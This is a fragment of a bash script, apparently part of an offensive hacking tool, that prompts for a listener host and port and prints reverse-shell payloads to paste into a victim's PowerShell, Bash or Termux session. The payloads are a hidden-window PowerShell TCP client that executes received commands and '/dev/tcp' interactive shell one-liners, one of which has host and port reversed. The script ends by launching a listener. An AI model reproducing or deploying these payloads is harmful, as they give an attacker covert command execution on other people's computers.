VERMILION='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN="\e[96m"
WHITE='\033[0;37m'
GREY='\e[90m'
sleep 0.5
echo -e "${WHITE}Netcat TCP Multi-Handler ..."
sleep 0.5
echo -e "${CYAN}"
read -p "Enter the Netcat TCP Multi-Handler host >>" LHOST
read -p "Enter the Netcat TCP Multi-Handler port >>" LPORT
echo -e "${WHITE}Netcat TCP Multi-Handler started.\n"
echo -e "Creating payload ..."
sleep 0.5
echo -e "${CYAN}For ${GREEN}Windows\n"
echo -e "${CYAN}You can directly ${GREEN}Copy Paste ${CYAN}this script to victim's ${GREEN}powershell. ${CYAN}Or you can make a ${VERMILION}.ps1 ${CYAN}file with this script\n"
echo -e "${GREY}Start-Process \$PSHOME\\powershell.exe -ArgumentList {\$TCPClient = New-Object Net.Sockets.TCPClient('$LHOST', $LPORT);\$NetworkStream = \$TCPClient.GetStream();\$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream);function WriteToStream (\$String) {[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {0};\$StreamWriter.Write(\$String);\$StreamWriter.Flush()}WriteToStream '';while((\$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}WriteToStream (\$Output)}\$StreamWriter.Close()} -WindowStyle Hidden\n"
echo -e "${CYAN}For ${GREEN}Linux\n"
echo -e "${CYAN}You can directly ${GREEN}Copy Paste ${CYAN}this script to victim's ${GREEN}Bash terminal. ${CYAN}Or you can make a ${VERMILION}.sh ${CYAN}file with this script\n"
echo -e "${GREY}(sh -i >& /dev/tcp/$LPORT/$LHOST 0>&1 & disown)\n"
echo -e "${CYAN}For ${GREEN}Termux\n"
echo -e "${CYAN}You can directly ${GREEN}Copy Paste ${CYAN}this script to victim's ${GREEN}termux. ${CYAN}Or you can make a ${VERMILION}.sh ${CYAN}file with this script\n"
echo -e "${GREY}(sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1 & disown)
"

     echo -e "${CYAN}"
    bash src/multihandler/multihandlerpow.sh $LHOST $LPORT 
    
    echo -e "${CYAN}\nPress any key to return to the menu..."
    read -n 1
done

"

